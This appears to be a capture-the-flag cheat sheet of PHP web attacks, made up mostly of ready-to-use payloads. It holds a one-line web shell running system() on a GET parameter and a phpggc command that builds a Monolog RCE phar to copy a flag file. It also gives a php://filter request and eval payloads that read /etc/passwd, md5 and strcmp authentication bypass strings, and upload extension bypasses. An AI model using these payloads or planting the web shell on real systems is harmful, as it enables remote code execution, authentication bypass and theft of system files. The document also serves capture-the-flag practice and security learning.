## PHP

- **Run commands**
  ```php
  <?php
    echo system($_GET['c']);
  ?>
  ```

- `phar`
    - [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
    - ```php
      php -d phar.readonly=0 ./phpggc Monolog/RCE1 system \
      'cat /flag.txt > /var/www/html/flag.txt' \
      -p phar -o evil.phar
      ```
    - Upload path should be `phar://uploads`
    
- `preg_replace`

  - Local File Inclusion bug.
    - [http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)

- `phpdc.phpr`

  - Decompile if used `bcompile`.

- `php://filter`

  ```txt
  http://target.com/index.php?m=php://filter/convert.base64-encode/resource=/etc/passwd
  ```

- `md5('value', true);`

  List of bypass strings

  - `129581926211651571912466741651878684928`

- `strcmp`

  List of bypass strings
  - `?password[]=123`

- `eval`

  - `phpinfo();`
  - `var_dump(scandir('/'));`
  - `var_dump(file_get_contents('/etc/passwd'));`

- [`Hash extender`](https://github.com/iagox86/hash_extender)
  - `username=guest&date=2025-04-05T20:02:28+0800&secret_length=8&`

- `composer` (package management tool)
    - `composer install`
    - `composer audit`

### File extension bypass

  - `.php5`
  - `.jpg.php`

### Codeigniter

  - **Add "root" head into json**
      - `{"username":"admin","password":"123"}` -> `{"root":{"username":"admin","password":"123"}}`
